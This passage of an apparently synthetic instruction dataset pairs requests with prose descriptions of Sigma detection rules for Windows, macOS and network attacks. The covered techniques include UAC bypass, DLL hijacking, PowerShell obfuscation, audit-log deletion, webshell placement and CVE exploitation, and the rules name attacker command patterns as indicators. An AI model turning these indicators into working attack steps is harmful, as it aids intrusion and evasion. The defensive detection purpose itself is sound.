    "output": "In order to detect the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors, you should: Monitor the creation of process events in Windows environments, particularly focusing on instances where the command line contains the execution of 'grpconv.exe -o' or 'grpconv -o'. This activity could indicate an attempt to utilize legacy utilities for malicious purposes, such as converting older .grp files possibly for persistence, which is a notable behavior of certain threats. Be aware of any instances detected, but also note that the identification of such activity may occasionally result from benign operations, although such cases are unknown. The severity of identifying such a command execution is considered high, urging prompt investigation upon detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors",
      "answer": "In order to detect the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors, you should: Monitor the creation of process events in Windows environments, particularly focusing on instances where the command line contains the execution of 'grpconv.exe -o' or 'grpconv -o'. This activity could indicate an attempt to utilize legacy utilities for malicious purposes, such as converting older .grp files possibly for persistence, which is a notable behavior of certain threats. Be aware of any instances detected, but also note that the identification of such activity may occasionally result from benign operations, although such cases are unknown. The severity of identifying such a command execution is considered high, urging prompt investigation upon detection."
    }
  },
  {
    "instruction": "Explain how should I detect the following: VBScript content stored into registry keys as seen being used by UNC2452 group",
    "context": "",
    "output": "In order to detect VBScript content stored into registry keys as seen being used by UNC2452 group, you should monitor the Windows registry for specific SetValue events within keys related to the 'Software\\Microsoft\\Windows\\CurrentVersion' path. Emphasis should be placed on identifying entries that contain VBScript-related content such as the use of 'vbscript:', 'jscript:', 'mshtml,', 'RunHTMLApplication', 'Execute(', 'CreateObject', or 'window.close'. However, it's crucial to exclude monitoring keys directly under 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' to reduce false positives, as legitimate operations frequently occur in this path.\n\nAdditionally, a more refined filtering should be applied to exclude any instances where the modifications are associated with the '.NET installer' processes, specifically signaled by the image path ending in '\\msiexec.exe' and targeting registry keys under '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\'. These exclusions should also consider details containing references to '.NET Primary Interop Assemblies' or specific file versions and cultural settings of 'Microsoft.mshtml.dll', as these are generally indicative of regular .NET installation activities rather than malicious interventions.\n\nThe approach should be vigilant for the sophistication of attack techniques akin to those deployed by the UNC2452 group, focusing on registry key modifications that serve as a means to execute VBScript for malicious purposes. Despite potential unknown false positives, the priority remains high in detecting these registry-based scripts, given their utilization in advanced persistent threat activities. Through this concentrated monitoring of registry set events, coupled with strategic exclusions, one can effectively identify and mitigate unauthorized VBScript execution within Windows environments, a tactic aligned with behaviors observed in the UNC2452 group's operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "VBScript content stored into registry keys as seen being used by UNC2452 group",
      "answer": "In order to detect VBScript content stored into registry keys as seen being used by UNC2452 group, you should monitor the Windows registry for specific SetValue events within keys related to the 'Software\\Microsoft\\Windows\\CurrentVersion' path. Emphasis should be placed on identifying entries that contain VBScript-related content such as the use of 'vbscript:', 'jscript:', 'mshtml,', 'RunHTMLApplication', 'Execute(', 'CreateObject', or 'window.close'. However, it's crucial to exclude monitoring keys directly under 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' to reduce false positives, as legitimate operations frequently occur in this path.\n\nAdditionally, a more refined filtering should be applied to exclude any instances where the modifications are associated with the '.NET installer' processes, specifically signaled by the image path ending in '\\msiexec.exe' and targeting registry keys under '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\'. These exclusions should also consider details containing references to '.NET Primary Interop Assemblies' or specific file versions and cultural settings of 'Microsoft.mshtml.dll', as these are generally indicative of regular .NET installation activities rather than malicious interventions.\n\nThe approach should be vigilant for the sophistication of attack techniques akin to those deployed by the UNC2452 group, focusing on registry key modifications that serve as a means to execute VBScript for malicious purposes. Despite potential unknown false positives, the priority remains high in detecting these registry-based scripts, given their utilization in advanced persistent threat activities. Through this concentrated monitoring of registry set events, coupled with strategic exclusions, one can effectively identify and mitigate unauthorized VBScript execution within Windows environments, a tactic aligned with behaviors observed in the UNC2452 group's operations."
    }
  },
  {
    "instruction": "Please help me detect the following: deletion of local audit logs",
    "context": "",
    "output": "Sure!\nIn order to detect the deletion of local audit logs, you should: focus on monitoring macOS process creation logs for instances where command line utilities typically used for file deletion, such as '/rm', '/unlink', and '/shred', are executed. Pay special attention to commands that target directories associated with logging, specifically '/var/log' and paths that include both '/Users/' and '/Library/Logs/'. The presence of these commands, especially when coupled, is indicative of a user attempting to erase local audit logs, which can be a sign of malicious activity aimed at covering tracks or undermining system auditing capabilities. Be mindful that legitimate administration activities might also trigger these detections, so additional context and investigation are recommended to differentiate between harmful actions and benign administrative tasks. The security level for this kind of activity is considered to be medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deletion of local audit logs",
      "answer": "In order to detect the deletion of local audit logs, you should: focus on monitoring macOS process creation logs for instances where command line utilities typically used for file deletion, such as '/rm', '/unlink', and '/shred', are executed. Pay special attention to commands that target directories associated with logging, specifically '/var/log' and paths that include both '/Users/' and '/Library/Logs/'. The presence of these commands, especially when coupled, is indicative of a user attempting to erase local audit logs, which can be a sign of malicious activity aimed at covering tracks or undermining system auditing capabilities. Be mindful that legitimate administration activities might also trigger these detections, so additional context and investigation are recommended to differentiate between harmful actions and benign administrative tasks. The security level for this kind of activity is considered to be medium."
    }
  },
  {
    "instruction": "Can you explain how to detect: potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class, you should: Monitor Windows image load events specifically targeting instances where the 'iexplore.exe' from the Internet Explorer directory is starting up or running, and simultaneously scanning for situations where 'iertutil.dll', also within the Internet Explorer directory, is being loaded. This type of scrutiny helps in identifying scenarios that might be indicative of a DLL hijacking attempt against the DCOM Internet Explorer Application Class, which is a method attackers could use to execute malicious code on a system. Any such matching pattern needs to be flagged with a high level of concern, although it's essential to note that there might be unknown scenarios that could trigger similar patterns without malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class",
      "answer": "In order to detect potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class, you should: Monitor Windows image load events specifically targeting instances where the 'iexplore.exe' from the Internet Explorer directory is starting up or running, and simultaneously scanning for situations where 'iertutil.dll', also within the Internet Explorer directory, is being loaded. This type of scrutiny helps in identifying scenarios that might be indicative of a DLL hijacking attempt against the DCOM Internet Explorer Application Class, which is a method attackers could use to execute malicious code on a system. Any such matching pattern needs to be flagged with a high level of concern, although it's essential to note that there might be unknown scenarios that could trigger similar patterns without malicious intent."
    }
  },
  {
    "instruction": "Can you explain how to detect: powershell scripts that adds a Name Resolution Policy Table (NRPT) rule for the specified namespace.\nThis will bypass the default DNS server and uses a specified server for answering the query.\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect PowerShell scripts that add a Name Resolution Policy Table (NRPT) rule for the specified namespace, which will bypass the default DNS server and use a specified server for answering the query, you should look for activity within PowerShell script logs. This detection focuses on systems that run Windows and requires that Script Block Logging is enabled to capture the necessary details. The specific indicators to watch for are the presence of 'Add-DnsClientNrptRule' along with '-Namesp' and '-NameSe' within the same script block text. This combination points to commands that are typically used to configure NRPT rules, indicating an attempt to change how DNS queries are resolved, potentially for malicious purposes. Due to the nature of this activity, it's tagged with a high level of concern, although it's important to consider the context of the execution, as there might be legitimate reasons for these PowerShell commands in certain environments.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "powershell scripts that adds a Name Resolution Policy Table (NRPT) rule for the specified namespace.\nThis will bypass the default DNS server and uses a specified server for answering the query.\n",
      "answer": "In order to detect PowerShell scripts that add a Name Resolution Policy Table (NRPT) rule for the specified namespace, which will bypass the default DNS server and use a specified server for answering the query, you should look for activity within PowerShell script logs. This detection focuses on systems that run Windows and requires that Script Block Logging is enabled to capture the necessary details. The specific indicators to watch for are the presence of 'Add-DnsClientNrptRule' along with '-Namesp' and '-NameSe' within the same script block text. This combination points to commands that are typically used to configure NRPT rules, indicating an attempt to change how DNS queries are resolved, potentially for malicious purposes. Due to the nature of this activity, it's tagged with a high level of concern, although it's important to consider the context of the execution, as there might be legitimate reasons for these PowerShell commands in certain environments."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Obfuscated Powershell via COMPRESS OBFUSCATION",
    "context": "",
    "output": "In order to detect obfuscated Powershell via COMPRESS OBFUSCATION, you should analyze process creation logs from Windows systems for specific command line patterns that indicate this type of obfuscation. Particularly, you should look for commands that contain all of the following elements: 'new-object' and 'text.encoding]::ascii'. Additionally, you should check for the presence of any of these elements in the command line arguments: 'system.io.compression.deflatestream', 'system.io.streamreader', or 'readtoend('. These patterns are common in PowerShell scripts that utilize compression techniques to obfuscate the script contents, making it harder to detect malicious activity. It's crucial to monitor for these indications, despite the potential for unknown false positives, as they are associated with medium-level security threats. The detection focuses on PowerShell invocations that employ specific .NET classes and methods related to ASCII encoding and stream manipulation, which are techniques commonly used in compressed obfuscation to disguise and execute malicious code.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via COMPRESS OBFUSCATION",
      "answer": "In order to detect obfuscated Powershell via COMPRESS OBFUSCATION, you should analyze process creation logs from Windows systems for specific command line patterns that indicate this type of obfuscation. Particularly, you should look for commands that contain all of the following elements: 'new-object' and 'text.encoding]::ascii'. Additionally, you should check for the presence of any of these elements in the command line arguments: 'system.io.compression.deflatestream', 'system.io.streamreader', or 'readtoend('. These patterns are common in PowerShell scripts that utilize compression techniques to obfuscate the script contents, making it harder to detect malicious activity. It's crucial to monitor for these indications, despite the potential for unknown false positives, as they are associated with medium-level security threats. The detection focuses on PowerShell invocations that employ specific .NET classes and methods related to ASCII encoding and stream manipulation, which are techniques commonly used in compressed obfuscation to disguise and execute malicious code."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious process related to rundll32 based on arguments",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious process related to rundll32 based on arguments, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the command line invocation of 'rundll32', a legitimate Windows command, which is being misused in this context. Pay attention to command line arguments that include either 'mshtml,RunHTMLApplication', 'mshtml,#135', which indicate an attempt to execute HTML applications or scripts, a common technique in various attacks. Additionally, be wary of command lines containing 'javascript:' or 'vbscript:', as these are scripting languages often used maliciously when combined with 'rundll32' to execute code directly in memory or perform other unauthorized actions. Remember that false positives may arise from legitimate administration scripts or tools, so these detections should be considered within the context of your environment's normal behavior. The detection of such activities is crucial in identifying and mitigating attacks that leverage 'rundll32' for malicious purposes, falling under tactics and techniques that involve the abuse of system features and scripted languages to execute commands, conduct reconnaissance, or achieve execution persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious process related to rundll32 based on arguments",
      "answer": "In order to detect suspicious process related to rundll32 based on arguments, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, watch for the command line invocation of 'rundll32', a legitimate Windows command, which is being misused in this context. Pay attention to command line arguments that include either 'mshtml,RunHTMLApplication', 'mshtml,#135', which indicate an attempt to execute HTML applications or scripts, a common technique in various attacks. Additionally, be wary of command lines containing 'javascript:' or 'vbscript:', as these are scripting languages often used maliciously when combined with 'rundll32' to execute code directly in memory or perform other unauthorized actions. Remember that false positives may arise from legitimate administration scripts or tools, so these detections should be considered within the context of your environment's normal behavior. The detection of such activities is crucial in identifying and mitigating attacks that leverage 'rundll32' for malicious purposes, falling under tactics and techniques that involve the abuse of system features and scripted languages to execute commands, conduct reconnaissance, or achieve execution persistence."
    }
  },
  {
    "instruction": "Please help me detect the following: pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
    "context": "",
    "output": "Sure!\nIn order to detect the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32), you should focus on monitoring registry set operations within Windows systems. Specifically, look for events where a SetValue event type occurs that targets the registry path ending with '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\\C:\\Program Files\\Windows Media Player\\osk.exe'. Additionally, these registry modifications should involve binary data as indicated in the event's details. It's important to note that the detection of such events is critical as they are associated with tactics and techniques like privilege escalation and defense evasion, indicating a potential attempt to bypass User Account Control (UAC) by exploiting the osksupport.dll component of Windows Media Player. Keep in mind that while this activity is highly indicative of malicious behavior, there might be unknown scenarios that could lead to false positives; thus, any detection should be investigated thoroughly to confirm the context of the activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
      "answer": "In order to detect the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32), you should focus on monitoring registry set operations within Windows systems. Specifically, look for events where a SetValue event type occurs that targets the registry path ending with '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\\C:\\Program Files\\Windows Media Player\\osk.exe'. Additionally, these registry modifications should involve binary data as indicated in the event's details. It's important to note that the detection of such events is critical as they are associated with tactics and techniques like privilege escalation and defense evasion, indicating a potential attempt to bypass User Account Control (UAC) by exploiting the osksupport.dll component of Windows Media Player. Keep in mind that while this activity is highly indicative of malicious behavior, there might be unknown scenarios that could lead to false positives; thus, any detection should be investigated thoroughly to confirm the context of the activity."
    }
  },
  {
    "instruction": "How to detect: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and\nto identify potential systems of interest for Lateral Movement.\nNetworks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\n",
    "context": "",
    "output": "In order to identify adversaries who are attempting to discover folders and drives shared on remote systems as part of their initial information gathering or to pinpoint potential targets for lateral movement within a network, you should monitor for specific activities within Windows PowerShell modules. Look for any instances where the commands containing 'get-smbshare' are executed. This can indicate an attempt to enumerate SMB shares available on the network, which often serve as shared network drives and folders allowing access to file directories across different systems. These activities can be detected in logs that originate from PowerShell modules, which would typically be part of the Windows product log sources.\n\nIt's important to note, however, that occurrences of these commands may not always signify malicious intent. Administrators or legitimate automated scripts may execute these commands for valid operational reasons, such as routine network maintenance or auditing. Therefore, these detections are considered to have a low level of confidence in indicating malicious activity without additional context. However, continuous monitoring and analysis of these detections, especially in correlation with other suspicious activities, could reveal attempts by adversaries to gather information necessary for further collection of sensitive data or to facilitate lateral movement within the targeted network environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and\nto identify potential systems of interest for Lateral Movement.\nNetworks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\n",
      "answer": "In order to identify adversaries who are attempting to discover folders and drives shared on remote systems as part of their initial information gathering or to pinpoint potential targets for lateral movement within a network, you should monitor for specific activities within Windows PowerShell modules. Look for any instances where the commands containing 'get-smbshare' are executed. This can indicate an attempt to enumerate SMB shares available on the network, which often serve as shared network drives and folders allowing access to file directories across different systems. These activities can be detected in logs that originate from PowerShell modules, which would typically be part of the Windows product log sources.\n\nIt's important to note, however, that occurrences of these commands may not always signify malicious intent. Administrators or legitimate automated scripts may execute these commands for valid operational reasons, such as routine network maintenance or auditing. Therefore, these detections are considered to have a low level of confidence in indicating malicious activity without additional context. However, continuous monitoring and analysis of these detections, especially in correlation with other suspicious activities, could reveal attempts by adversaries to gather information necessary for further collection of sensitive data or to facilitate lateral movement within the targeted network environment."
    }
  },
  {
    "instruction": "Explain how should I detect the following: LDP failures which may be indicative of brute force attacks to manipulate MPLS labels",
    "context": "",
    "output": "In order to detect LDP failures which may be indicative of brute force attacks to manipulate MPLS labels, you should: monitor Cisco's Label Distribution Protocol (LDP) service logs for specific incidents. Focus on analyzing log data that captures the LDP as the protocol being utilized. Look for log entries containing keywords such as \"SOCKET_TCP_PACKET_MD5_AUTHEN_FAIL\" or \"TCPMD5AuthenFail,\" which indicate failed attempts at TCP MD5 authentication. These failures can be essential indicators of malicious attempts to brute-force MPLS label manipulation. Ensure that the TCP connection local and remote addresses (`tcpConnLocalAddress` and `tcpConnRemAddress`) are also scrutinized to identify the source and target of the suspicious activity. While false positives are rare and mainly attributed to misconfigurations, maintaining vigilance in tracking these specific indicators can help preempt and mitigate potential attacks targeting the MPLS infrastructure.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "LDP failures which may be indicative of brute force attacks to manipulate MPLS labels",
      "answer": "In order to detect LDP failures which may be indicative of brute force attacks to manipulate MPLS labels, you should: monitor Cisco's Label Distribution Protocol (LDP) service logs for specific incidents. Focus on analyzing log data that captures the LDP as the protocol being utilized. Look for log entries containing keywords such as \"SOCKET_TCP_PACKET_MD5_AUTHEN_FAIL\" or \"TCPMD5AuthenFail,\" which indicate failed attempts at TCP MD5 authentication. These failures can be essential indicators of malicious attempts to brute-force MPLS label manipulation. Ensure that the TCP connection local and remote addresses (`tcpConnLocalAddress` and `tcpConnRemAddress`) are also scrutinized to identify the source and target of the suspicious activity. While false positives are rare and mainly attributed to misconfigurations, maintaining vigilance in tracking these specific indicators can help preempt and mitigate potential attacks targeting the MPLS infrastructure."
    }
  },
  {
    "instruction": "How can I detect: CVE-2020-10148 SolarWinds Orion API authentication bypass attempts",
    "context": "",
    "output": "In order to detect CVE-2020-10148 SolarWinds Orion API authentication bypass attempts, you should focus on monitoring webserver logs for specific patterns in the query strings of URLs. Look for requests containing '/WebResource.axd', '/ScriptResource.axd', '/i18n.ashx', or '/Skipi18n' in their query parameters as these could indicate an attempt to exploit the vulnerability. Additionally, watch for requests that include '/SolarWinds/' or '/api/' in their query strings, as these are also potentially malicious patterns associated with the attack.\n\nHowever, not all requests that match these patterns are indicative of an attack. Exclude from alerts the valid requests that contain 'Orion/Skipi18n/Profiler/' or feature 'css.i18n.ashx' and 'js.i18n.ashx' in the query parameters, since these can be legitimate traffic patterns and might otherwise lead to false positives.\n\nThis approach combines a meticulous selection of potentially malicious query parameters with exclusions for known benign patterns, balancing sensitivity to the attack with a need to minimize unwarranted alerts. The severity of this monitoring is considered critical due to the nature of the vulnerability being exploited.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "CVE-2020-10148 SolarWinds Orion API authentication bypass attempts",
      "answer": "In order to detect CVE-2020-10148 SolarWinds Orion API authentication bypass attempts, you should focus on monitoring webserver logs for specific patterns in the query strings of URLs. Look for requests containing '/WebResource.axd', '/ScriptResource.axd', '/i18n.ashx', or '/Skipi18n' in their query parameters as these could indicate an attempt to exploit the vulnerability. Additionally, watch for requests that include '/SolarWinds/' or '/api/' in their query strings, as these are also potentially malicious patterns associated with the attack.\n\nHowever, not all requests that match these patterns are indicative of an attack. Exclude from alerts the valid requests that contain 'Orion/Skipi18n/Profiler/' or feature 'css.i18n.ashx' and 'js.i18n.ashx' in the query parameters, since these can be legitimate traffic patterns and might otherwise lead to false positives.\n\nThis approach combines a meticulous selection of potentially malicious query parameters with exclusions for known benign patterns, balancing sensitivity to the attack with a need to minimize unwarranted alerts. The severity of this monitoring is considered critical due to the nature of the vulnerability being exploited."
    }
  },
  {
    "instruction": "Explain how should I detect the following: write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell",
    "context": "",
    "output": "In order to detect a write of an Exchange Certificate Signing Request (CSR) to an untypical directory or with an aspx name suffix which can be used to place a webshell, you should monitor the Microsoft Exchange Management service on Windows systems for specific command lines that indicate the generation and export of an Exchange certificate request. Look for the command 'New-ExchangeCertificate' combined with parameters such as '-GenerateRequest', '-BinaryEncoded', and '-RequestFile'. Additionally, be alert for the request being written to suspicious file paths or using file names with an '.aspx' suffix, which are common indicators of an attempt to place a webshell. These paths include '\\\\\\\\localhost\\\\C$', '\\\\\\\\127.0.0.1\\\\C$', and 'C:\\\\inetpub'. The combination of these command options and file paths serves as a critical indicator of a potentially malicious activity related to the manipulation or exploitation of Microsoft Exchange services. Monitoring for these activities with minimal false positives is crucial for defending against threats aiming to establish persistence or gain unauthorized access through webshells.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell",
      "answer": "In order to detect a write of an Exchange Certificate Signing Request (CSR) to an untypical directory or with an aspx name suffix which can be used to place a webshell, you should monitor the Microsoft Exchange Management service on Windows systems for specific command lines that indicate the generation and export of an Exchange certificate request. Look for the command 'New-ExchangeCertificate' combined with parameters such as '-GenerateRequest', '-BinaryEncoded', and '-RequestFile'. Additionally, be alert for the request being written to suspicious file paths or using file names with an '.aspx' suffix, which are common indicators of an attempt to place a webshell. These paths include '\\\\\\\\localhost\\\\C$', '\\\\\\\\127.0.0.1\\\\C$', and 'C:\\\\inetpub'. The combination of these command options and file paths serves as a critical indicator of a potentially malicious activity related to the manipulation or exploitation of Microsoft Exchange services. Monitoring for these activities with minimal false positives is crucial for defending against threats aiming to establish persistence or gain unauthorized access through webshells."
    }
  },
  {
    "instruction": "How to detect: processes loading the non-existent DLL \"ShellChromeAPI\". One known example is the \"DeviceEnroller\" binary in combination with the \"PhoneDeepLink\" flag tries to load this DLL.\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n",
    "context": "",
    "output": "In order to detect processes loading the non-existent DLL \"ShellChromeAPI\", which could indicate that adversaries are attempting to execute their own malicious DLL via legitimate Windows processes like DeviceEnroller.exe by misusing the \"PhoneDeepLink\" flag, you should focus on monitoring image loading activities within Windows environments. Specifically, you should pay attention to any instances where a DLL ending with the name \"\\ShellChromeAPI.dll\" is loaded. This DLL should not exist on modern Windows systems, and any attempt to load it should be considered suspicious and possibly indicative of an attack where an adversary is leveraging a renamed malicious DLL to compromise the system. It is important to remain vigilant for false positives, although they are currently unknown, and treat any detection at a high severity level due to the potential for significant system compromise. This technique is a telltale sign of adversaries trying to discreetly execute malicious code under the guise of legitimate operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "processes loading the non-existent DLL \"ShellChromeAPI\". One known example is the \"DeviceEnroller\" binary in combination with the \"PhoneDeepLink\" flag tries to load this DLL.\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n",
      "answer": "In order to detect processes loading the non-existent DLL \"ShellChromeAPI\", which could indicate that adversaries are attempting to execute their own malicious DLL via legitimate Windows processes like DeviceEnroller.exe by misusing the \"PhoneDeepLink\" flag, you should focus on monitoring image loading activities within Windows environments. Specifically, you should pay attention to any instances where a DLL ending with the name \"\\ShellChromeAPI.dll\" is loaded. This DLL should not exist on modern Windows systems, and any attempt to load it should be considered suspicious and possibly indicative of an attack where an adversary is leveraging a renamed malicious DLL to compromise the system. It is important to remain vigilant for false positives, although they are currently unknown, and treat any detection at a high severity level due to the potential for significant system compromise. This technique is a telltale sign of adversaries trying to discreetly execute malicious code under the guise of legitimate operations."
    }
  },
  {
    "instruction": "Can you explain how to detect: potential exploitation of CVE-2023-21554 (dubbed QueueJumper)",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential exploitation of CVE-2023-21554 (dubbed QueueJumper), you should: monitor the process creation logs on Windows systems, specifically looking for events where the Microsoft Message Queue Service (`mqsvc.exe`), located in the `Windows\\System32` directory, spawns known command execution or scripting tools. These tools include `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. Identifying such a pattern is critical as it might indicate an attempt to exploit QueueJumper, leveraging `mqsvc.exe` as a parent process to execute potentially malicious commands or scripts. It's important to have vigilant monitoring in place due to the high impact of this vulnerability, while also being aware of possible unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential exploitation of CVE-2023-21554 (dubbed QueueJumper)",
      "answer": "In order to detect potential exploitation of CVE-2023-21554 (dubbed QueueJumper), you should: monitor the process creation logs on Windows systems, specifically looking for events where the Microsoft Message Queue Service (`mqsvc.exe`), located in the `Windows\\System32` directory, spawns known command execution or scripting tools. These tools include `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`, `rundll32.exe`, `schtasks.exe`, `wmic.exe`, `wscript.exe`, and `wsl.exe`. Identifying such a pattern is critical as it might indicate an attempt to exploit QueueJumper, leveraging `mqsvc.exe` as a parent process to execute potentially malicious commands or scripts. It's important to have vigilant monitoring in place due to the high impact of this vulnerability, while also being aware of possible unknown false positives."
    }
  }
]